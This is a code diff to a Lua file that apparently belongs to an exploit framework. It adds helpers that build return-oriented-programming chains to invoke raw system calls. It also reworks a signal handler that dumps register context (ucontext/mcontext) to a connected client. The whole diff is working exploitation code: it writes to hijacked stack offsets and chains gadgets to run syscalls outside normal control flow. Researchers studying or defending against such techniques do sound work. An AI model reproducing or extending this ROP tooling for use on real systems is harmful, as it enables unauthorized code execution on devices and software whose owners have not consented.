@@ -1439,6 +1439,7 @@ end
 
 memory = {}
 
+-- memory.alloc() always return zeroed buffer 
 function memory.alloc(size)
     -- compensate for write corruption by lua primitive
     size = align_16(size + 8)
@@ -1900,7 +1901,38 @@ function ropchain:push_sysv(rdi, rsi, rdx, rcx, r8, r9)
     if r9 then self:push_set_r9(r9) end
 end
 
+function ropchain:push_syscall_raw(syscall, prep_arg_callback)
+
+    assert(syscall.fn_addr and syscall.syscall_no)
+
+    local push_size = 0
+    local push_cb = function()
+        self:push_write_qword_memory(self:get_rsp() + push_size, syscall.fn_addr)
+        if prep_arg_callback then
+            prep_arg_callback()
+        end
+        self:push_set_rax(syscall.syscall_no)
+    end
+
+    push_size = self:mock_push(push_cb)
+    push_cb()
+    
+    self:push(0) -- will be overwritten
+end
+
+function ropchain:push_syscall(syscall, rdi, rsi, rdx, rcx, r8, r9)
+    self:push_syscall_raw(syscall, function()
+        self:push_sysv(rdi, rsi, rdx, rcx, r8, r9)
+    end)
+end
+
+function ropchain:push_syscall_with_ret(syscall, rdi, rsi, rdx, rcx, r8, r9)
+    self:push_syscall(syscall, rdi, rsi, rdx, rcx, r8, r9)
+    self:push_store_retval()
+end
+
 -- if `is_ptr` is set, rip is assumed to be ptr to the real address
+-- this fn will always allocate memory to hold return value
 function ropchain:push_fcall_raw(rip, prep_arg_callback, is_ptr)
 
     local ret_value = memory.alloc(8)
@@ -1921,7 +1953,9 @@ function ropchain:push_fcall_raw(rip, prep_arg_callback, is_ptr)
 
     local push_cb = function()
         self:push_write_qword_memory(fcall_stub.return_addr, self:get_rsp() + push_size)
-        prep_arg_callback()
+        if prep_arg_callback then
+            prep_arg_callback()
+        end
         self:push_set_rsp(fcall_stub.fn_addr)
     end
 
@@ -2665,24 +2699,19 @@ function signal.setup_handler(pivot_handler)
     chain:push_store_rdx_into_memory(ucontext_struct_addr)
 
     -- send signal info to client
-    chain:push_fcall_raw(syscall.write.fn_addr, function()
+    chain:push_syscall_raw(syscall.write, function()
         chain:push_set_rdx(0x18)
         chain:push_set_rsi(output_addr)
         chain:push_set_reg_from_memory("rdi", signal.fd_addr)
-        chain:push_set_rax(syscall.write.syscall_no)
     end)
 
     -- send mcontext buffer to client
-    chain:push_fcall_raw(syscall.write.fn_addr, function()
-
+    chain:push_syscall_raw(syscall.write, function()
         chain:push_set_rdx(0x100)
-
         chain:push_set_rax_from_memory(ucontext_struct_addr)
         chain:push_add_to_rax(mcontext_offset)
         chain:push_set_reg_from_rax("rsi")
-
         chain:push_set_reg_from_memory("rdi", signal.fd_addr)
-        chain:push_set_rax(syscall.write.syscall_no)
     end)
 
     --
